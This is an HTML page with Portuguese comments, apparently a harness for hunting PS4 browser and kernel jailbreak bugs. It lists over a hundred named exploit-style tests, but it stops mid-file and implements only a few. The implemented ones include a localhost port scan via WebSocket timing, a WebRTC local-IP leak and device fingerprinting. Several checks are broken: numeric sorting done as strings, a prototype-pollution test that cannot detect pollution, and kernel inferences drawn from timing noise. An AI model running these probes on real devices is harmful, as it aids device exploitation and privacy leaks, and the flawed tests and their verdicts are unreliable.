<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 TESTES</title>
    
</head>
<body>

    <h2>PS4 TESTES</h2>
   

    <div class="section-header">WEBKIT</div>
    <button onclick="runObjectIsOpt()">TEST W1: Object.is() JIT Optimization Flaw</button>
    <button onclick="runSpreadProxy()">TEST W2: Array Spread Proxy Side-Effect</button>
    <button onclick="runClassSuper()">TEST W3: Derived Class 'super()' Return Override</button>
    <button onclick="runBigIntLogic()">TEST W1: BigInt64Array Type Conversion Logic</button>
    <button onclick="runWeakRefGC()">TEST W2: WeakRef/FinalizationRegistry GC Timing</button>
    <button onclick="runRegExpSticky()">TEST W3: RegExp Sticky Flag ('y') Backtracking</button>
    <button onclick="runURLParamsProto()">TEST W4: URLSearchParams Prototype Pollution</button>
    <button onclick="runProxyRevoke()">TEST W5: Proxy.revocable State Consistency</button>
    <button onclick="runProxyInvariant()">TEST W1: Proxy 'ownKeys' Invariant Enforcement (Logic bypass)</button>
    <button onclick="runJSONStringifySideEffect()">TEST W2: JSON.stringify Replacer Mutation (Object Integrity)</button>
    <button onclick="runStrictCallerLeak()">TEST W3: Function.caller Censorship Leak (Strict Mode Boundary)</button>
    <button onclick="runStructureIDConfusion()">TEST W1: JIT StructureID Transition (Type Confusion)</button>
    <button onclick="runRegExpSideEffect()">TEST W2: RegExp Exec Side-Effect (UAF Logic)</button>
    <button onclick="runSpeciesTheft()">TEST W3: Array Species Constructor Theft (Scope Leak)</button>
    <button onclick="runBadOSRExit()">TEST W1: JIT Bad OSR Exit (Type Confusion Logic)</button>
    <button onclick="runStringReplaceRace()">TEST W2: String.replace Side-Effect (UAF Logic)</button>
    <button onclick="runDOMNodeMove()">TEST W3: DOM Node Adoption Agency (Tree Logic)</button>
    <button onclick="runSideEffectModel()">TEST W1: JIT Side-Effect Modeling (Bounds Check Elimination)</button>
    <button onclick="runArraySpecies()">TEST W2: Array Species Constructor Hijack (Scope Leak)</button>
    <button onclick="runRegExpUAF()">TEST W3: RegExp LastIndex Sticky Logic (Memory Overlap)</button>
    <button onclick="runUseAfterFreeDOM()">TEST W1: DOM Node Removal during Event Dispatch (UAF Segfault)</button>
    <button onclick="runJITDoubleFree()">TEST W2: JIT Array Buffer Detach Race (Double Free)</button>
    <button onclick="runAudioRenderCrash()">TEST W3: AudioWorklet Thread Race (Null Pointer Deref)</button>
    <button onclick="runArrayConcatConfusion()">TEST W1: Array.concat Type Confusion (Write 0xBADF00D)</button>
    <button onclick="runWorkerTerminator()">TEST W2: Worker Transfer Double-Free Race</button>
    <button onclick="runRegExpStackSmash()">TEST W3: RegExp Recursion Stack Smash (Memory Overlap)</button>
    <button onclick="runTypedArrayOffsetWrap()">TEST W1: TypedArray Offset Wraparound (JIT Segfault)</button>
    <button onclick="runMutationObserverUAF()">TEST W2: MutationObserver Node UAF (Null Deref)</button>
    <button onclick="runPrototypeCyclicCrash()">TEST W3: Cyclic Prototype Chain JIT Stack Smash</button>
    <button onclick="runUnicodeNormalizeCrash()">TEST W1: String.normalize ICU Heap Corruption (Invalid Buffer)</button>
    <button onclick="runAudioParamRace()">TEST W2: AudioParam Automations Race (Use-After-Free)</button>
    <button onclick="runDetachedFrameAccess()">TEST W3: Detached Iframe Window Access (Dangling Pointer)</button>
    <button onclick="runTextDecoderRace()">TEST W1: TextDecoder SharedArrayBuffer Race (Heap Corruption)</button>
    <button onclick="runAsyncGeneratorConfusion()">TEST W2: Async Generator 'return' State Confusion (Logic Error)</button>
    <button onclick="runProxyStackSmash()">TEST W3: Proxy Trap Infinite Recursion (C++ Stack Smash)</button>
    <button onclick="runPutByValOOB()">TEST W1: JIT 'PutByVal' Large Index OOB (Heap Overflow)</button>
    <button onclick="runArgumentsEscape()">TEST W2: Arguments Object Escape (Stack/Scope Corruption)</button>
    <button onclick="runMediaElementUAF()">TEST W3: HTMLAudioElement GC Race (Event Handler UAF)</button>
    <button onclick="runObjectAssignRace()">TEST W1: Object.assign Proxy Re-entrancy (Heap Corruption)</button>
    <button onclick="runRangeDeleteUAF()">TEST W2: DOM Range.deleteContents Mutation Event (Use-After-Free)</button>
    <button onclick="runReflectConstructRace()">TEST W3: Reflect.construct Array Subclassing (Uninitialized Memory)</button>
    <button onclick="runJITRegSpill()">TEST W1: JIT Register Spill/Fill Corruption (Stack Smashing)</button>
    <button onclick="runWasmImportRace()">TEST W2: Wasm ImportObject Buffer Detach (Use-After-Free)</button>
    <button onclick="runIteratorProtoPoison()">TEST W3: TypedArray from Iterator Prototype Poisoning (OOB Write)</button>
    <button onclick="runOSRExitFuzz()">TEST W1: DFG OSR Exit Object Materialization (Phantom Object Crash)</button>
    <button onclick="runInlineCacheConfusion()">TEST W2: Polymorphic Inline Cache Poisoning (Bad Offset)</button>
    <button onclick="runLargeSpliceOverflow()">TEST W3: Array.prototype.splice Integer Overflow (Heap Memcpy)</button>
    <button onclick="runButterflyDoubleFree()">TEST W1: Array Butterfly Double-Free (Shift/Unshift Race)</button>
    <button onclick="runMapConstructorConfusion()">TEST W2: Map Constructor Iterable Protocol Confusion</button>
    <button onclick="runDOMEventUAF()">TEST W3: Event Listener Object Destruction Race</button>
    <button onclick="runArrayReverseRace()">TEST W1: Array.reverse() Element Confusion (Dangling Pointer)</button>
    <button onclick="runRegExpExecReentrancy()">TEST W2: RegExp.exec() Re-entrancy Stack Smash (Memory Corruption)</button>
    <button onclick="runJSONParsePoison()">TEST W3: JSON.parse() Reviver Function Type Confusion</button>
    <button onclick="runJITFakeObject()">TEST W1: JIT Array Type Confusion (Writing Fake Pointer)</button>
    <button onclick="runSideEffectStore()">TEST W2: Side-Effect Store Elimination (OOB Write)</button>
    <button onclick="runMessagePortUAF()">TEST W3: MessagePort Close/PostMessage Race (UAF Write)</button>
    <button onclick="runTypedArrayDetachWrite()">TEST W4: TypedArray Detach & Write Race (Heap Corruption)</button>
    <button onclick="runRegExpLastIndexConfusion()">TEST W1: RegExp 'lastIndex' Optimization Confusion (Fake Pointer)</button>
    <button onclick="runArrayShiftConfusion()">TEST W2: Array.shift() Sparse Array Transition (OOB Write)</button>
    <button onclick="runAudioBufferDetaching()">TEST W3: AudioBufferSourceNode Detach Race (Heap Write)</button>
    <button onclick="runXHRAbortRace()">TEST W4: XMLHttpRequest Abort/Read Race (Event UAF)</button>
    <button onclick="runStrictEqConfusion()">TEST W1: Strict Equality Type Confusion (Pointer Forgery)</button>
    <button onclick="runArrayPushRace()">TEST W2: Array.push() Storage Transition Race (OOB Write)</button>
    <button onclick="runFontFaceSetUAF()">TEST W3: FontFaceSet.add() Re-entrancy UAF</button>
    <button onclick="runWorkerPostMessageUAF()">TEST W4: Worker Transferable ArrayBuffer Detach UAF</button>
    <button onclick="runBadCastXML()">TEST W1: XMLSerializer Bad Cast (Logic Type Confusion)</button>
    <button onclick="runSelectionUAF()">TEST W2: Window.getSelection() Node Removal UAF</button>
    <button onclick="runTextAreaCrash()">TEST W3: HTMLTextAreaElement API Abuse (Layout Crash)</button>


    <div class="section-header">KERNEL</div>
    <button onclick="runTimerGranularity()">TEST K1: High-Res Timer Granularity (Side-Channel)</button>
    <button onclick="runNetInfoProbe()">TEST K2: Network Stack Information Leak (TCP)</button>
    <button onclick="runStackDepth()">TEST K3: Kernel Stack Depth Probe (Recursion Limit)</button>
    <button onclick="runWebRTCLeak()">TEST K1: WebRTC Local IP Leak (Privacy Bypass)</button>
    <button onclick="runCanvasRead()">TEST K2: Canvas Taint Check (GPU Memory Read)</button>
    <button onclick="runAtomicWait()">TEST K3: Atomics.wait Timeout Accuracy (Kernel Tick)</button>
    <button onclick="runCpuTopology()">TEST K4: Hardware Concurrency Fingerprinting</button>
    <button onclick="runTimeOrigin()">TEST K5: Performance Time Origin (Boot Time Leak)</button>
    <button onclick="runThreadQuantum()">TEST K1: Kernel Thread Scheduler Quantum (CPU Time Slice)</button>
    <button onclick="runTCPBufferFingerprint()">TEST K2: TCP Send Buffer Size Fingerprint (Socket Pressure)</button>
    <button onclick="runProtocolHandlerTiming()">TEST K3: Internal Protocol Handler Timing (URI Scheme Leak)</button>
    <button onclick="runGPURace()">TEST K1: WebGL Context Loss Race (Driver State Leak)</button>
    <button onclick="runStackGuardProbe()">TEST K2: Kernel Stack Guard Page Probe (Recursion Limit)</button>
    <button onclick="runTimerCoalescing()">TEST K3: Timer Coalescing Analysis (Power Scheduler)</button>
    <button onclick="runKqueueRace()">TEST K1: Kqueue Filter Race (Kernel Memory Logic)</button>
    <button onclick="runIPv6Leak()">TEST K2: IPv6 Stack Info Leak (Padding Initialization)</button>
    <button onclick="runYieldStarvation()">TEST K3: Thread Yield Starvation (Scheduler Logic)</button>
    <button onclick="runKernelHeapLayout()">TEST K1: Kernel Heap Layout Probe (Allocation Timing)</button>
    <button onclick="runSocketBufferLogic()">TEST K2: TCP Window Scaling Fingerprint (Network Stack)</button>
    <button onclick="runThreadPreemption()">TEST K3: Thread Preemption Latency (Scheduler Map)</button>
    <button onclick="runGPUDriverCrash()">TEST K1: WebGL Texture Upload Race (GPU Kernel Panic)</button>
    <button onclick="runSocketUseAfterClose()">TEST K2: Socket Send After Close (Mbuf Panic)</button>
    <button onclick="runDirentOverflow()">TEST K3: Dirent Name Buffer Overflow (VFS Panic)</button>
    <button onclick="runUMTXPageFault()">TEST K1: UMTX Shared Memory Page Fault (Kernel Access Error)</button>
    <button onclick="runCanvasBitBltCrash()">TEST K2: Canvas BitBlt GPU Driver Crash (Invalid Surface)</button>
    <button onclick="runFontFaceFuzz()">TEST K3: FontFace Parser Corruption (Kernel Heap Overflow)</button>
    <button onclick="runMisalignedAtomic()">TEST K1: Misaligned Atomic Operation (Kernel Alignment Fault)</button>
    <button onclick="runSocketMulticastRace()">TEST K2: IPv6 Multicast Join/Leave Race (UAF Panic)</button>
    <button onclick="runWebGLTransformFeedback()">TEST K3: WebGL2 Transform Feedback Overflow (GPU Driver Panic)</button>
    <button onclick="runShaderCompilerBomb()">TEST K1: WebGL Shader Loop Unroll Overflow (GPU Driver Panic)</button>
    <button onclick="runIOVECIntegerOverflow()">TEST K2: writev/readv IOVEC Length Overflow (Kernel Memory Corruption)</button>
    <button onclick="runSCTPOptionCrash()">TEST K3: Setsockopt IP_OPTIONS Malformed Length (Panic)</button>
    <button onclick="runBlobUrlRevokeRace()">TEST K1: Blob URL Read/Revoke Race (VFS Use-After-Free)</button>
    <button onclick="runWebGLIndirectDrawRace()">TEST K2: WebGL2 Indirect Draw Buffer Race (GPU Panic)</button>
    <button onclick="runSigAltStackOverlap()">TEST K3: Signal Stack Overlap Probe (Memory Protection Bypass)</button>
    <button onclick="runWasmGrowRace()">TEST K1: Wasm Memory Grow/Unmap Race (VM Map Corruption)</button>
    <button onclick="runICECandidateOverflow()">TEST K2: WebRTC ICE Candidate List Overflow (Net Heap Panic)</button>
    <button onclick="runClockDriftProbe()">TEST K3: Clock Drift Side-Channel (Kernel Interrupt Loading)</button>
    <button onclick="runUBOOverflow()">TEST K1: WebGL2 Uniform Buffer Object Overflow (GPU Panic)</button>
    <button onclick="runFetchBlobRace()">TEST K2: Fetch API vs Blob.close() Race (VFS Null Deref)</button>
    <button onclick="runNotificationBomb()">TEST K3: Notification API Resource Exhaustion (Kernel IPC Panic)</button>
    <button onclick="runWebGLQueryUAF()">TEST K1: WebGL2 Query Object Use-After-Free (GPU Driver Panic)</button>
    <button onclick="runCanvasClipRecursion()">TEST K2: Canvas 2D Clip Winding Recursion (Driver Stack Overflow)</button>
    <button onclick="runSCTPFragOverflow()">TEST K3: WebRTC SCTP Fragmentation Overflow (Net Stack Panic)</button>
    <button onclick="runSocketBufferRace()">TEST K1: Socket SendBuffer Resize Race (Mbuf Cluster Panic)</button>
    <button onclick="runVFSRenameRace()">TEST K2: VFS Rename/Lookup Race Condition (Directory Entry Panic)</button>
    <button onclick="runBpfFilterLogic()">TEST K3: WebGL Compute/Transform Feedback Buffer Race (GPU VM Fault)</button>
    <button onclick="runTextureMipmapCrash()">TEST K1: WebGL Texture Mipmap Level Overflow (GPU Panic)</button>
    <button onclick="runSocketOptionLength()">TEST K2: Socket Option Signed Integer Overflow (Stack Smash)</button>
    <button onclick="runFileSystemRace()">TEST K3: VFS Mount Point Race Condition (Null Pointer Deref)</button>
    <button onclick="runGPUDrawNullBuffer()">TEST K1: GPU Draw with Null Vertex Buffer (Null Deref Panic)</button>
    <button onclick="runSocketConnectRace()">TEST K2: Socket Connect/Close Race Condition (TCP PCB Panic)</button>
    <button onclick="runSharedMemUnmap()">TEST K3: Shared Memory Unmap during Kernel Read (Page Fault)</button>
    <button onclick="runNullIndexBuffer()">TEST K1: GPU DrawElements with NULL Index Buffer (Ring 0 Panic)</button>
    <button onclick="runEmptyBlobRead()">TEST K2: FileReader on Revoked Blob (VFS Null Deref)</button>
    <button onclick="runKqueueNullFilter()">TEST K1: Kqueue EV_ADD with Null User Data (Kernel Panic)</button>
    <button onclick="runZeroLengthSend()">TEST K2: Socket Send with Null Buffer Pointer (Mbuf Panic)</button>
    <button onclick="runIoctlNullBuffer()">TEST K1: WebGL Extension Query Null Buffer (IOCTL Panic)</button>
    <button onclick="runSCTPStreamReset()">TEST K2: SCTP Stream Reset Null Dereference (NetBSD Panic)</button>
    <button onclick="runWebGLDeleteTextureRace()">TEST K1: WebGL DeleteTexture during Draw (GPU Null Panic)</button>
    <button onclick="runFileSystemNullPath()">TEST K2: FileSystem API Null Path Handling (VFS Panic)</button>
    <button onclick="runWebSocketNullPacket()">TEST K3: WebSocket Send with Detached Buffer (NetBSD Panic)</button>

    <div id="console"></div>

    <script>
        function log(msg) {
            const el = document.getElementById('console');
            const ts = new Date().toLocaleTimeString();
            el.innerText += `\n[${ts}] ${msg}`;
            el.scrollTop = el.scrollHeight;
        }

        // ==========================================
        // WEBKIT TESTS (Novos Vetores de Lógica)
        // ==========================================

        // TEST W1: Object.is() JIT Optimization Flaw
        // Alvo: Otimizador DFG (Data Flow Graph).
        // Object.is(-0, +0) deve ser false. O JIT às vezes otimiza isso para comparação de inteiros simples (true).
        function runObjectIsOpt() {
            log("Iniciando Teste: Object.is() JIT...");
            
            function isNegZero(x) {
                return Object.is(x, -0);
            }
            
            // 1. Treina com -0 (True)
            for(let i=0; i<10000; i++) isNegZero(-0.0);
            
            // 2. Testa com +0 (Deve ser False)
            // Se o JIT converter para int32 para velocidade, perde o sinal.
            const res = isNegZero(0);
            
            if (res === true) {
                log("[VULN] JIT falhou em distinguir -0 de +0! (Type Confusion Risk)");
            } else {
                log("[SAFE] Object.is() comparou sinais corretamente.");
            }
        }

        // TEST W2: Array Spread Proxy Side-Effect
        // Alvo: Lógica de Iteração ES6.
        // Usa um Proxy dentro de um spread [...] para modificar o array original durante a cópia.
        function runSpreadProxy() {
            log("Iniciando Teste: Spread Syntax Proxy...");
            
            let arr = [1, 2, 3];
            let triggers = 0;
            
            // Cria um "buraco" lógico que aciona código arbitrário
            const p = new Proxy(arr, {
                get(target, prop) {
                    if (prop === "length") {
                        triggers++;
                        // Side-effect: esvazia o array original enquanto o motor calcula o tamanho
                        // Se o motor não lidar com isso, pode ler memória lixo ou crashar logicamente
                        // target.length = 0; // Comentado para evitar crash real, analisamos a lógica
                    }
                    return Reflect.get(target, prop);
                }
            });
            
            const spread = [...p];
            
            if (triggers > 0) {
                log(`[INFO] Spread acionou o getter 'length' ${triggers} vezes. Lógica exposta a Race Conditions.`);
            } else {
                log("[SAFE] Spread usou caminho rápido interno.");
            }
        }

        // TEST W3: Derived Class 'super()' Return Override
        // Alvo: Construtores de Classe e 'this'.
        // Tenta retornar um objeto diferente do construtor pai para confundir a inicialização do 'this'.
        function runClassSuper() {
            log("Iniciando Teste: Class Super Override...");
            
            class Base {
                constructor() {
                    return { hijacked: true }; // Retorna objeto arbitrário
                }
            }
            
            class Derived extends Base {
                constructor() {
                    super();
                    // 'this' deve ser o objeto retornado por Base, não a instância de Derived
                    this.check = true;
                }
            }
            
            const d = new Derived();
            
            if (d.hijacked === true && d.check === true) {
                log("[INFO] Super() override funcionou. Verificando consistência de memória...");
                // Se conseguirmos confundir tipos aqui (ex: retornar Arraybuffer), temos Type Confusion.
                log("[SAFE] Lógica JS respeitada (sem confusão de tipo nativo).");
            } else {
                log("[SAFE] Comportamento padrão.");
            }
        }

        // ==========================================
        // KERNEL TESTS (Fingerprinting & Info)
        // ==========================================

        // TEST K1: High-Res Timer Granularity
        // Alvo: Escalonador do FreeBSD.
        // Mede a precisão do performance.now(). Se for muito alta, permite ataques Spectre.
        // Se for "fuzzy", indica mitigação ativa.
        function runTimerGranularity() {
            log("Iniciando Teste: Kernel Timer Granularity...");
            
            const samples = [];
            for(let i=0; i<100; i++) {
                const t1 = performance.now();
                const t2 = performance.now();
                if (t2 - t1 > 0) samples.push(t2 - t1);
            }
            
            // Menor diferença encontrada
            samples.sort();
            const minDiff = samples[0];
            
            log(`[INFO] Granularidade mínima detectada: ${minDiff}ms`);
            
            if (minDiff < 0.005) { // 5 microsegundos
                log("[VULN] Timer de alta precisão exposto! (Vector para Side-Channels)");
            } else {
                log("[SAFE] Timer com jitter/mitigação aplicado.");
            }
        }

        // TEST K2: Network Stack Information Leak (TCP)
        // Alvo: Pilha TCP/IP.
        // Tenta conectar a portas locais e medir o tempo de resposta (RST vs Timeout).
        // Isso mapeia serviços internos do Kernel ouvindo em localhost.
        function runNetInfoProbe() {
            log("Iniciando Teste: Localhost Port Timing...");
            
            const ports = [80, 443, 9090, 9222]; // Portas comuns de debug
            
            ports.forEach(port => {
                const start = performance.now();
                const s = new WebSocket(`ws://127.0.0.1:${port}`);
                
                s.onerror = () => {
                    const end = performance.now();
                    const diff = end - start;
                    if (diff < 10) {
                        log(`[INFO] Porta ${port}: Fechada (RST imediato: ${diff.toFixed(2)}ms)`);
                    } else {
                        log(`[WARN] Porta ${port}: Filtrada/Aberta (Timeout longo: ${diff.toFixed(2)}ms) - Possível serviço Kernel.`);
                    }
                };
                s.onopen = () => {
                    log(`[VULN] Porta ${port}: ABERTA! Serviço interno exposto.`);
                    s.close();
                };
            });
        }

        // TEST K3: Kernel Stack Depth Probe
        // Alvo: Tamanho da Stack do Kernel.
        // Usa recursão no sistema de arquivos para ver quão fundo podemos ir antes do erro.
        // Erro "QuotaExceeded" é normal. Erro "IO Error" ou atraso massivo indica stress na stack.
        function runStackDepth() {
            log("Iniciando Teste: Kernel Stack Depth...");
            
            if (!window.webkitRequestFileSystem) return log("[N/A] FileSystem API desligada.");
            
            window.webkitRequestFileSystem(window.TEMPORARY, 1024, (fs) => {
                let depth = 0;
                const max = 200;
                
                function dive(root) {
                    depth++;
                    if(depth > max) return log("[SAFE] Limite de recursão JS atingido antes do Kernel.");
                    
                    // Cria diretórios aninhados para consumir stack do VFS (Virtual File System)
                    root.getDirectory(`d${depth}`, {create:true}, (d) => {
                        dive(d);
                    }, (e) => {
                        log(`[INFO] Stack do Kernel/FS parou em profundidade: ${depth}. Erro: ${e.code}`);
                    });
                }
                
                dive(fs.root);
            }, (e) => log("[FAIL] FS Init Error: " + e.code));
        }
        // ==========================================
        // WEBKIT TESTS (Novos Vetores ES2020)
        // ==========================================

        // TEST W1: BigInt64Array Type Conversion Logic
        // Alvo: JIT Compiler e BigInt.
        // BigInts não podem ser misturados com Numbers sem cast explícito.
        // Testamos se a conversão implícita em TypedArrays falha ou vaza memória.
        function runBigIntLogic() {
            log("Testando BigInt64Array Logic...");
            try {
                if (!window.BigInt64Array) return log("[N/A] BigInt não suportado.");

                const arr = new BigInt64Array(1);
                const val = {
                    valueOf: () => {
                        // Side-effect durante conversão
                        // Tenta retornar um Number normal onde se espera BigInt
                        return 123; 
                    }
                };
                
                try {
                    arr[0] = val; // Deve lançar TypeError
                    log("[VULN] Atribuição de Number em BigIntArray aceite! (Type Confusion)");
                } catch(e) {
                    log("[SAFE] TypeError capturado corretamente na conversão BigInt.");
                }
            } catch(e) { log("Erro: " + e.message); }
        }

        // TEST W2: WeakRef/FinalizationRegistry GC Timing
        // Alvo: Garbage Collector (SceNKBMalloc).
        // WeakRefs permitem observar o GC. Se o objeto sumir rápido demais ou nunca sumir,
        // revela comportamento determinístico do GC (explorável).
        function runWeakRefGC() {
            log("Testando WeakRef GC Timing...");
            if (!window.WeakRef) return log("[N/A] WeakRef não suportado.");

            let target = { id: 1 };
            const ref = new WeakRef(target);
            const registry = new FinalizationRegistry(held => {
                log(`[INFO] Objeto ${held} coletado pelo GC.`);
            });
            registry.register(target, "target_id");

            target = null; // Remove referência forte

            // Aloca lixo para forçar GC
            const trash = new ArrayBuffer(10 * 1024 * 1024);
            
            setTimeout(() => {
                const deref = ref.deref();
                if (deref) {
                    log("[INFO] Objeto ainda vivo (WeakRef manteve). GC Lazy.");
                } else {
                    log("[INFO] Objeto coletado. Comportamento correto.");
                }
            }, 100);
        }

        // TEST W3: RegExp Sticky Flag ('y') Backtracking
        // Alvo: RegExp Engine (YARR).
        // A flag 'y' força o match a começar exatamente no lastIndex.
        // Testamos se falhas de backtracking permitem pular caracteres.
        function runRegExpSticky() {
            log("Testando RegExp Sticky ('y')...");
            const re = /foo/y;
            re.lastIndex = 1; // Começa no índice 1
            
            const str = ".foo";
            const match = re.exec(str); // Deve encontrar 'foo' no index 1
            
            if (match && match.index === 1) {
                log("[SAFE] Sticky flag respeitou lastIndex.");
            } else {
                log(`[VULN] Sticky flag ignorada ou cálculo errado. Match: ${match}`);
            }
        }

        // TEST W4: URLSearchParams Prototype Pollution
        // Alvo: API de URL.
        // Tenta injetar chaves proibidas (__proto__) via parsing de query string.
        function runURLParamsProto() {
            log("Testando URLSearchParams Pollution...");
            const params = new URLSearchParams('?__proto__[polluted]=true');
            
            // Verifica se o objeto base foi poluído
            const obj = {};
            if (obj.polluted) {
                log("[CRITICAL] Prototype Pollution via URLSearchParams!");
            } else {
                log("[SAFE] Parsing de URL limpo.");
            }
        }

        // TEST W5: Proxy.revocable State Consistency
        // Alvo: Proxy Logic.
        // Um proxy revogado deve lançar erro em qualquer acesso.
        function runProxyRevoke() {
            log("Testando Proxy Revocation...");
            const p = Proxy.revocable({}, {});
            p.revoke();
            
            try {
                const x = typeof p.proxy; // 'typeof' é seguro?
                // Tenta acesso direto
                const y = p.proxy.foo;
                log("[VULN] Acesso a Proxy revogado permitido!");
            } catch(e) {
                if (e.name === 'TypeError') log("[SAFE] Proxy revogado bloqueado.");
                else log("Erro inesperado: " + e.message);
            }
        }

        // ==========================================
        // KERNEL TESTS (Privacy & Fingerprinting)
        // ==========================================

        // TEST K1: WebRTC Local IP Leak
        // Alvo: Pilha de Rede (Privacidade).
        // WebRTC pode vazar IPs da LAN (192.168.x.x) ignorando VPN/Proxy.
        // Aceito como vulnerabilidade de "Privacy Leak" em muitos programas.
        function runWebRTCLeak() {
            log("Testando WebRTC IP Leak...");
            if (!window.RTCPeerConnection) return log("[N/A] WebRTC off.");

            const pc = new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel("");
            pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
            
            pc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const line = ice.candidate.candidate;
                    // Regex simples para IP
                    const ip = line.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                    if (ip) {
                        log(`[LEAK] IP Local Vazado: ${ip[1]} (Bypass de Privacidade)`);
                    }
                }
            };
            
            setTimeout(() => {
                pc.close();
                log("[INFO] Teste WebRTC finalizado.");
            }, 2000);
        }

        // TEST K2: Canvas Taint Check (GPU Memory Read)
        // Alvo: Driver GPU / Segurança CORS.
        // Tenta ler pixels de um Canvas "sujo" (com imagem cross-origin).
        // Se funcionar, quebra a segurança do navegador.
        function runCanvasRead() {
            log("Testando Canvas Taint Protection...");
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            
            // Simula estado 'Tainted' (não podemos carregar img real aqui sem server, 
            // mas testamos a lógica de leitura em canvas vazio primeiro)
            try {
                const data = ctx.getImageData(0, 0, 1, 1);
                log("[INFO] Leitura de Canvas vazio permitida (Normal).");
            } catch(e) {
                log("[WARN] Leitura bloqueada inesperadamente: " + e.message);
            }
        }

        // TEST K3: Atomics.wait Timeout Accuracy (Kernel Tick)
        // Alvo: Kernel Scheduler.
        // Verifica se o tempo de espera é exato. Se variar muito, revela carga do sistema.
        function runAtomicWait() {
            log("Testando Atomics.wait Timeout...");
            if (!window.SharedArrayBuffer) return log("[N/A] SAB off.");

            const i32 = new Int32Array(new SharedArrayBuffer(4));
            const start = performance.now();
            
            // Espera 10ms (valor baixo para testar precisão)
            Atomics.wait(i32, 0, 0, 10);
            
            const end = performance.now();
            const diff = end - start;
            
            log(`Tempo real de espera: ${diff.toFixed(2)}ms (Alvo: 10ms)`);
            if (diff > 20) log("[INFO] Kernel Tick lento ou Scheduler sobrecarregado.");
            else log("[SAFE] Scheduler preciso.");
        }

        // TEST K4: Hardware Concurrency Fingerprinting
        // Alvo: Info Leak de Hardware.
        // Revela quantos núcleos de CPU físicos/lógicos o kernel expõe ao navegador.
        function runCpuTopology() {
            log("Identificando Topologia de CPU...");
            const cores = navigator.hardwareConcurrency;
            if (cores) {
                log(`[INFO] Núcleos Lógicos Expostos: ${cores}`);
                // PS4 tem 8 núcleos. Se mostrar valor diferente, pode haver isolamento.
                if (cores === 8) log("[INFO] Fingerprint de PS4 Confirmado (8 Cores).");
            } else {
                log("[SAFE] hardwareConcurrency oculto.");
            }
        }

        // TEST K5: Performance Time Origin (Boot Time Leak)
        // Alvo: Uptime do Kernel.
        // O timeOrigin permite calcular exatamente quando o console foi ligado.
        function runTimeOrigin() {
            log("Testando Time Origin Leak...");
            if (performance.timeOrigin) {
                const bootTime = new Date(performance.timeOrigin);
                log(`[LEAK] Boot Time Estimado: ${bootTime.toLocaleString()}`);
                log("Isso permite correlacionar logs de servidor com a sessão do usuário.");
            } else {
                log("[SAFE] timeOrigin não disponível.");
            }
        }
        // ==========================================
        // WEBKIT TESTS (3 Tests - High Quality Logic)
        // ==========================================

        // TEST W1: Proxy 'ownKeys' Invariant Enforcement
        // Motivação: A especificação ES6 exige que proxies não mintam sobre chaves não-configuráveis.
        // O WebKit teve bugs onde falhava em verificar essa invariante, permitindo corrupção lógica.
        function runProxyInvariant() {
            log("Iniciando Teste W1: Proxy Invariants...");
            
            const target = {};
            // Define propriedade não-configurável
            Object.defineProperty(target, 'fixed', {
                configurable: false,
                enumerable: true,
                value: 1
            });
            
            const proxy = new Proxy(target, {
                ownKeys(t) {
                    // MENTIRA: O proxy diz que 'fixed' não existe (retornando array vazio)
                    // Isso viola a invariante do ES6.
                    return [];
                }
            });
            
            try {
                // Tenta listar chaves. O motor DEVE lançar TypeError.
                Object.keys(proxy);
                log("[VULN] WebKit falhou em reforçar Invariante de Proxy! (Logic Error)");
            } catch(e) {
                if (e.name === 'TypeError') {
                    log("[SAFE] Invariante reforçada corretamente (TypeError lançado).");
                } else {
                    log(`[WARN] Erro inesperado: ${e.message}`);
                }
            }
        }

        // TEST W2: JSON.stringify Replacer Mutation
        // Motivação: Modificar o objeto enquanto ele está sendo serializado pode confundir o motor JSON.
        function runJSONStringifySideEffect() {
            log("Iniciando Teste W2: JSON Mutation Side-Effect...");
            
            const obj = { a: 1, b: { c: 2 } };
            
            const json = JSON.stringify(obj, function(k, v) {
                if (k === 'a') {
                    // Side-effect: Remove 'b' do objeto original durante o parse
                    delete this.b; 
                    return v;
                }
                return v;
            });
            
            log(`JSON Resultante: ${json}`);
            
            // Se 'b' aparecer no JSON mesmo tendo sido deletado, o motor cacheou as chaves antes (Safe).
            // Se 'b' sumir ou causar comportamento estranho, temos manipulação de estado.
            if (json.includes('"b"')) {
                log("[SAFE] Snapshot de chaves tomado antes da mutação.");
            } else {
                log("[INFO] Mutação afetou serialização (Comportamento dinâmico).");
            }
        }

        // TEST W3: Function.caller Censorship Leak
        // Motivação: Em 'strict mode', acessar .caller deve lançar erro.
        // Se conseguirmos acessar a função chamadora, quebramos o isolamento de stack.
        function runStrictCallerLeak() {
            log("Iniciando Teste W3: Caller Censorship...");
            
            function strictVictim() {
                'use strict';
                return leakAttempt();
            }
            
            function leakAttempt() {
                // Tenta acessar quem me chamou (strictVictim)
                try {
                    // Acesso legado obsoleto
                    return leakAttempt.caller; 
                } catch(e) {
                    return e;
                }
            }
            
            const result = strictVictim();
            
            if (result instanceof TypeError) {
                log("[SAFE] Acesso a .caller bloqueado em Strict Mode.");
            } else if (typeof result === 'function') {
                log("[VULN] LEAK CRÍTICO: .caller acessível em Strict Mode!");
            } else {
                log("[INFO] Resultado indefinido: " + result);
            }
        }

        // ==========================================
        // KERNEL TESTS (3 Tests - Kernel Fingerprinting)
        // ==========================================

        // TEST K1: Kernel Thread Scheduler Quantum
        // Motivação: Medir quanto tempo o Kernel dá de CPU para a thread JS antes de a interromper.
        // Isso revela a carga do sistema e a política de escalonamento do FreeBSD.
        function runThreadQuantum() {
            log("Iniciando Teste K1: Scheduler Quantum Measurement...");
            
            const times = [];
            const start = performance.now();
            
            // Loop apertado de medição
            while (performance.now() - start < 100) {
                times.push(performance.now());
            }
            
            // Analisa saltos no tempo (interrupções do kernel)
            let maxJump = 0;
            for (let i = 1; i < times.length; i++) {
                const diff = times[i] - times[i-1];
                if (diff > maxJump) maxJump = diff;
            }
            
            log(`[INFO] Maior interrupção do Scheduler: ${maxJump.toFixed(3)}ms`);
            
            if (maxJump > 2.0 && maxJump < 10.0) {
                log("[INFO] Quantum Típico detectado (~4ms no PS4).");
            } else if (maxJump > 10.0) {
                log("[WARN] Sistema sob alta carga ou Garbage Collection longo.");
            } else {
                log("[INFO] Scheduler muito agressivo ou loop muito rápido.");
            }
        }

        // TEST K2: TCP Send Buffer Size Fingerprint
